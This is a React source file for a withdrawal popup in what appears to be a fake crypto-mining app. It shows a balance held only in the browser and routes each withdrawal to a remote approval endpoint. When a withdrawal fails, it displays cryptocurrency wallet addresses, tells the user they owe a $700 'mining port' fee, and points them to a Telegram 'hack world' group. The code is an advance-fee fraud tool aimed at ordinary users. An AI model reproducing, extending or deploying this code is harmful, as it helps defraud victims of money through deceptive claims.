import React, { useState, useEffect } from "react";
import "./withdraw.css";
import toast from "react-hot-toast";
import { useHistory } from "react-router-dom";


const WithdrawPopup = ({ isOpen, onClose, onWithdraw }) => {
  const [withdrawAmount, setWithdrawAmount] = useState("");
  const [storedWithdrawAmount, setStoredWithdrawAmount] = useState(0);
  const [didWithdrawFail, setWithdrawFailureStatus] = useState(false);
  const [selectedNetwork, changeSelectedNetwork] = useState("");
  const [networkAddress, setNetworkAddress] = useState("");
  const totalWithdrawn = parseInt(localStorage.getItem('totalWithdrawn')?.trim()) || 0;
  const history = useHistory();


  // Load stored withdrawal amount from local storage on component mount
  useEffect(() => {
    const storedAmount = localStorage.getItem("totalVolume");
    if (storedAmount) {
      // setStoredWithdrawAmount(parseFloat(5000));
      setStoredWithdrawAmount(parseFloat(storedAmount));
    }
  }, []);


  useEffect(() => {
    setTimeout(() => {
      if (didWithdrawFail) {
        setWithdrawFailureStatus(false);
        onClose();
      }
    }, 15000);
  }, [didWithdrawFail, onClose]);


  const handleWithdraw = async () => {
    const userId = localStorage.getItem("userId");
    const userAPIToken = localStorage.getItem("userAPIToken");

    if (!userId) {
      toast.error("Please login before you can perform withdraw");
      return;
    }

    if (!withdrawAmount || Number.isNaN(withdrawAmount) || parseFloat(withdrawAmount) <= 0) {
      toast.error("Please enter a valid withdrawal amount.");
      return;
    }

    if (parseFloat(withdrawAmount) > storedWithdrawAmount) {
      toast.error("Unable to withdraw this amount. Insufficient funds.");
      return;
    }
    if (parseFloat(storedWithdrawAmount) < 3000) {
      toast.error("Your balance must be up to 3000.");
      return;
    }

    const SERVER_BASE_URL = "";
    const CHECK_WITHDRAWAL_APPROVAL_API_ENDPOINT = "https://exam-nodejs-main.onrender.com/api/withdrawal/approval/";

    try {
      // let res = await fetch(`http://localhost:3001/api/withdrawal/approval/${userId}`, {
      let res = await fetch(`${CHECK_WITHDRAWAL_APPROVAL_API_ENDPOINT}${userId}`, {
        method: 'POST',
        headers: {
          'content-type': 'application/json',
          'user-api-token': userAPIToken
        },
        body: JSON.stringify({
          datetime: Date.now(),
          network: selectedNetwork,
          address: networkAddress,
          amount: withdrawAmount
        })
      });

      res = await res.json();
      const isApproved = res?.withdrawal_status;

      if (isApproved) {
        console.log("[USER - APPROVED]");
        toast.success(
          <div>
            ✅ Succesfull Withdrawal.
            <br />
            <span style={{ color: "darkgoldenrod", fontWeight: "bolder" }}>
              ✅ ${parseFloat(withdrawAmount).toFixed(2)}&nbsp;
            </span>
            Withdrawn!.
            <br />
            ✅ Thank You!.
            {/* Thank You. */}
          </div>,
          {
            duration: 7000
          }
        );
        // setSuccess(true);
        // setTimeout(() => window.location.reload(), 3000);

        // Update new balance on succesful withdrawal.
        // We update Multiple times in hopes that we win any race condition.
        // localStorage.setItem("totalWithdrawn", totalWithdrawn + withdrawAmount);
        localStorage.setItem("totalWithdrawn", totalWithdrawn + parseInt(withdrawAmount));
        // localStorage.setItem("totalVolume", storedWithdrawAmount - withdrawAmount);
        // localStorage.setItem("totalVolume", storedWithdrawAmount - withdrawAmount);
        return;
      }
      else {
        toast.error(res.error);
        setWithdrawFailureStatus(true);
      }

    } catch (error) {
      toast.error("\n Network Error \n Please Try Again.");
      // setTimeout(() => window.location.reload(), 3000);
    }

  };

  return (
    <div className={`withdraw-popup ${isOpen ? "open" : ""}`}>
      <div className="withdraw-popup-content">
        {didWithdrawFail ?
          (
            // <></>
            <p className="success-message">
              <span style={{ color: "yellow" }}> btcAddress = 123JgU9Zih5GBWN7mWKML2jSNCUwx8yb8j</span>
              <span style={{ color: "green" }}> usdtTrc20Address = TTGUJhv8jZKiUApoet6S9xXStUbZCCTywy</span>
              <span style={{ color: "orange" }}> ethereumAddress = 0x87cdd933bf000f96309215752696ae080f684ba9 </span>
              <span style={{ color: "red" }}>
                (You have an outstanding balance of $700 which was used to mine your crypto )
                <br />
                The crypto mining ⛏️ port you been mining ⛏️ from is not free
                The total 💳 fee you owing is $700 <br />
                Based on how long you have been mining
                You have successfully mined above $3k, so you are eligible to withdraw your mined coins
                When you pay the $700 your mining ⛏️ port web open and you can withdraw your funds
              </span>
              <br />
              <span style={{ color: "red" }}>

                <span style={{ color: "green" }}> (How to confirm): </span>
                Contact hack world support where you bought the software from
                You are free to keep mining for nothing stop 🛑 you!
                <br />

              </span>

              <span style={{ color: "green" }}>💬 Contact use to get started:
                <a style={{ color: "blue" }} target="_blank" rel="noreferrer" href="https://t.me/hackworldgroup">(https://t.me/hackworldgroup)</a>
              </span>
            </p>
          ) : (
            <>
              <span className="close" onClick={onClose}>
                &times;
              </span>
              <h2 style={{ color: "black" }}> Withdraw Funds</h2>

              <label style={{ color: "black" }} htmlFor="withdrawAmount">
                Amount:
              </label>
              <input
                style={{ color: "black", backgroundColor: "grey" }}
                type="number"
                id="withdrawAmount"
                value={withdrawAmount}
                onChange={(e) => setWithdrawAmount(e.target.value)}
              />

              <label style={{ color: "black" }} htmlFor="withdrawAmount">
                Network:
              </label>
              <select style={{ width: '100%', height: '40px', marginBottom: '15px', }}
                onChange={(e) => {
                  console.log(e.target.value);
                  changeSelectedNetwork(e.target.value);
                }}
              >
                <option>Select Network for Payment</option>
                <option value="Ethereum">Ethereum (ETH)</option>
                <option value="Bitcoin">Bitcoin (BTC)</option>
                <option value="Litecoin">Litecoin (LTC)</option>
                <option value="Solana">Solana (SOL)</option>
                <option value="Base">Base (BASE)</option>
                <option value="Arbitrum">Arbitrum (ARB)</option>
                <option value="Optimism">Optimism (OP)</option>
              </select>

              <label style={{ color: "black" }} htmlFor="withdrawAmount">
                Address:
              </label>
              <input style={{ color: "black", backgroundColor: "grey" }} type="text" id="withdrawAmount"
                onChange={(e) => setNetworkAddress(e.target.value)} />

              <div style={{ color: "black" }}>Available Withdrawal Amount:
                <span style={{ color: "darkgoldenrod" }}>
                  ${(storedWithdrawAmount - totalWithdrawn).toFixed(2)}
                </span>
              </div>

              <button type="button" style={{ backgroundColor: "black", color: "orange" }} onClick={handleWithdraw}>
                Withdraw
              </button>
            </>
          )}
      </div>
    </div>
  );
};

export default WithdrawPopup;
